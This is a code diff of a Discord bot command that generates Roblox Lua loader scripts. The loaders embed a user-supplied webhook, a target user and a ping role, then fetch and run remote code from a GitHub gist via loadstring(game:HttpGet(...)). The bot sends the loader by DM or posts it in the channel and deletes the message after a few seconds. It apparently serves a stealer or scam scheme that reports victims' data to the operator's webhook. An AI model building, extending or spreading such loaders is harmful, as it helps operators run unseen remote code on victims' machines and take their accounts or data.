@@ -50,12 +50,17 @@ export async function execute(interaction) {
   const target = submitted.fields.getTextInputValue('target');
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
+  // ---- UPDATED GIST URL ----
+  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/af8de2cfa2b03c8d143a0c4243e60dc2/raw/1141c2cb716328278e2290caaca6596e92734b1c/ANTIWARESS";
+  
   const baseScript = `
 _G.YOUR_WEBHOOK = '${webhook}'
 _G.TARGET_USER = '${target}'
 _G.PING_ROLE_ID = '${pingRole}'
-https://gist.githubusercontent.com/malik020859-ui/ff9a2485ae183418a8af418a2dbf9e11/raw/316b8d58ced9b8080886a8551eb9bad7750de3ce/ANTIWARES', true))()
+
+loadstring(game:HttpGet("${GIST_URL}"))()
 `;
+  // ---- END ----
 
   await submitted.deferReply();
 
@@ -92,7 +97,6 @@ https://gist.githubusercontent.com/malik020859-ui/ff9a2485ae183418a8af418a2dbf9e
   try {
     await interaction.user.send(dmMessage);
   } catch (err) {
-    // If DMs are closed, send in channel with delete
     const channelMsg = await submitted.editReply(`✅ **Loader generated!**\n\n**PC:**\n\`\`\`lua\n${loadstring}\n\`\`\`\n**Mobile:**\n${loadstring}`);
     setTimeout(() => {
       channelMsg.delete().catch(() => {});
@@ -100,7 +104,6 @@ https://gist.githubusercontent.com/malik020859-ui/ff9a2485ae183418a8af418a2dbf9e
     return;
   }
 
-  // Send confirmation in channel, delete after 7 seconds
   const confirmMsg = await submitted.editReply('✅ Loader generated and sent to your DMs!');
   setTimeout(() => {
     confirmMsg.delete().catch(() => {});
